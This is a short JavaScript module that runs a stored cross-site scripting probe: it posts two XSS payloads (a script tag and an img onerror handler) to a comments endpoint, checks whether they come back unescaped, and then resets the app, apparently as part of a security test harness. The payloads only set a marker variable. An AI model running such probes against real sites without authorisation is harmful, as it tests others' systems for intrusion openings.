const axios = require('axios');

const PAYLOADS = [
  '<script>window.__pwned__=true</script>',
  '<img src=x onerror="window.__pwned__=true">',
];

function excerpt(body, payload) {
  const idx = body.indexOf(payload);
  if (idx !== -1) {
    const start = Math.max(0, idx - 40);
    return body.slice(start, idx + payload.length + 40).slice(0, 200);
  }
  return body.slice(0, 200);
}

async function runXssAttack({ baseUrl }) {
  const start = Date.now();
  const triedSummaries = [];
  let lastEscapedExcerpt = '';

  for (const payload of PAYLOADS) {
    try {
      await axios.post(
        `${baseUrl}/comments`,
        { author: 'attacker', text: payload },
        { headers: { 'Content-Type': 'application/json' }, timeout: 5000 }
      );

      const res = await axios.get(`${baseUrl}/comments`, { timeout: 5000 });
      const body = typeof res.data === 'string' ? res.data : String(res.data);

      if (body.includes(payload)) {
        const result = {
          vulnerability: 'xss',
          exploited: true,
          payload,
          evidence: excerpt(body, payload),
          durationMs: Date.now() - start,
        };
        try {
          await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
        } catch {}
        return result;
      }

      lastEscapedExcerpt = excerpt(body, payload);
      triedSummaries.push(`Payload "${payload}": not present unescaped`);
    } catch (err) {
      const status = err.response ? err.response.status : 'network_error';
      triedSummaries.push(`Payload "${payload}": ${status} — ${err.message}`);
    }
  }

  try {
    await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
  } catch {}

  const evidence = (lastEscapedExcerpt
    ? `Escaped output sample: ${lastEscapedExcerpt}. `
    : '') + triedSummaries.join('; ');

  return {
    vulnerability: 'xss',
    exploited: false,
    payload: null,
    evidence: evidence.slice(0, 200),
    durationMs: Date.now() - start,
  };
}

module.exports = { runXssAttack };
